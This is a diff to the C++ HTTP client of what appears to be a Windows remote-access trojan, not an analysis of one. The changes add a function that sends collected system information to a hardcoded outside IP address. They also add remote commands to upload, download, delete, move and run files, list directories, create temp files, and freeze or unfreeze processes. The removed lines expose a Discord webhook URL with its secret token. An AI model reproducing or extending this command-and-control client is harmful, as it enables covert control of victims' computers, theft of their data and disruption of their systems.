@@ -1,4 +1,8 @@
-﻿#include "HttpClient.hpp"
+﻿/*
+Acts as the command receiver and executor.
+The system maintains real-time communication between the client and server through structured HTTP requests.
+*/
+#include "HttpClient.hpp"
 #include <sstream>
 #include <iomanip>
 #include <chrono>
@@ -13,7 +17,7 @@
 #include "../Command/FatalScreen.hpp"
 #include "../Command/WhiteScreen.hpp"
 
-const std::string webhook_url = "https://discord.com/api/webhooks/1309748638746021908/VMymuy7VoRLcfZqGIwuxP2D9N69dnIVF8HtOlfr7RwuX61pKntccsjyQxmcdeaz5i5Il";
+const std::string SERVER_URL = "localhost:3000";
 
 std::string formatSize(uintmax_t size) {
     const char* units[] = { "B", "KB", "MB", "GB" };
@@ -36,6 +40,48 @@ HttpClient::HttpClient() : is_running(false), last_command("") {
     signal(SIGTERM, signalHandler);
 
     Logger::getInstance()->info("HttpClient Initialized");
+}
+
+void HttpClient::initialize(const nlohmann::json& sysInfo) {
+    systemInfo = sysInfo;
+
+    try {
+        std::string url = SERVER_URL + "/register";
+
+        HINTERNET hInternet = InternetOpenA("System Info Client",
+            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+        if (!hInternet) {
+            Logger::getInstance()->expection("Failed to open internet connection");
+            return;
+        }
+
+        HINTERNET hConnect = InternetConnectA(hInternet, "47.81.10.50",
+            3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+
+        if (!hConnect) {
+            InternetCloseHandle(hInternet);
+            return;
+        }
+
+        std::string jsonStr = systemInfo.dump();
+        std::string headers = "Content-Type: application/json\r\n";
+
+        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/register",
+            NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+
+        if (hRequest) {
+            HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
+                (LPVOID)jsonStr.c_str(), jsonStr.length());
+            InternetCloseHandle(hRequest);
+        }
+
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+    }
+    catch (const std::exception& e) {
+        Logger::getInstance()->expection(std::string("Error sending system info: ") + e.what());
+    }
 }
 
 HttpClient::~HttpClient() {
@@ -217,7 +263,103 @@ void HttpClient::executeCommand(const std::string& cmd) {
                 success = false;
             }
         }
-        
+        else if (command == "upload" && !argument.empty()) {
+            std::string source = argument.substr(0, argument.find(' '));
+            std::string dest = argument.substr(argument.find(' ') + 1);
+            if (FileManager::uploadFile(source, dest)) {
+                result = "Successfully uploaded file: " + source + " to " + dest;
+                success = true;
+            }
+            else {
+                result = "Failed to upload file";
+            }
+        }
+        else if (command == "download" && !argument.empty()) {
+            std::string source = argument.substr(0, argument.find(' '));
+            std::string dest = argument.substr(argument.find(' ') + 1);
+            if (FileManager::downloadFile(source, dest)) {
+                result = "Successfully downloaded file: " + source + " to " + dest;
+                success = true;
+            }
+            else {
+                result = "Failed to download file";
+            }
+        }
+        else if (command == "delete" && !argument.empty()) {
+            if (FileManager::deleteFile(argument)) {
+                result = "Successfully deleted file: " + argument;
+                success = true;
+            }
+            else {
+                result = "Failed to delete file";
+            }
+        }
+        else if (command == "move" && !argument.empty()) {
+            size_t spacePos = argument.find(' ');
+            if (spacePos != std::string::npos) {
+                std::string sourcePath = argument.substr(0, spacePos);
+                std::string destPath = argument.substr(spacePos + 1);
+
+                if (FileManager::moveFile(sourcePath, destPath)) {
+                    result = "Successfully moved file from " + sourcePath + " to " + destPath;
+                    success = true;
+                }
+                else {
+                    result = "Failed to move file";
+                }
+            }
+            else {
+                result = "Invalid move command format. Use: move sourcePath destPath";
+            }
+            }
+        else if (command == "list" && !argument.empty()) {
+                std::vector<std::string> files = FileManager::listFiles(argument);
+                if (!files.empty()) {
+                    std::stringstream ss;
+                    ss << "Files in directory " << argument << ":\n";
+                    for (const auto& file : files) {
+                        ss << file << "\n";
+                    }
+                    result = ss.str();
+                    success = true;
+                }
+                else {
+                    result = "Directory is empty or cannot access: " + argument;
+                }
+                }
+        else if (command == "run" && !argument.empty()) {
+            if (FileManager::runFile(argument)) {
+                result = "Successfully launched file: " + argument;
+                success = true;
+            } else {
+                result = "Failed to launch file: " + argument;
+            }
+        }
+        else if (command == "create-temp" && !argument.empty()) {
+            if (TempCreator::createTempFiles(argument)) {
+                result = "Successfully created temp file with size: " + argument;
+                success = true;
+            }
+            else {
+                result = "Failed to create temp file";
+            }
+            }
+        else if (command == "ws" && !argument.empty()) {
+            if (WhiteScreen::freezeProcess(argument)) {
+                    result = "Successfully froze process: " + argument;
+                    success = true;
+                } else {
+                    result = "Failed to freeze process: " + argument;
+                }
+            }
+        else if (command == "unws" && !argument.empty()) {
+            if (WhiteScreen::unfreezeProcess(argument)) {
+                result = "Successfully unfroze process: " + argument;
+                success = true;
+            } else {
+                result = "Failed to unfreeze process: " + argument;
+            }
+        }
         else {
             result = "Unknown command";
         }
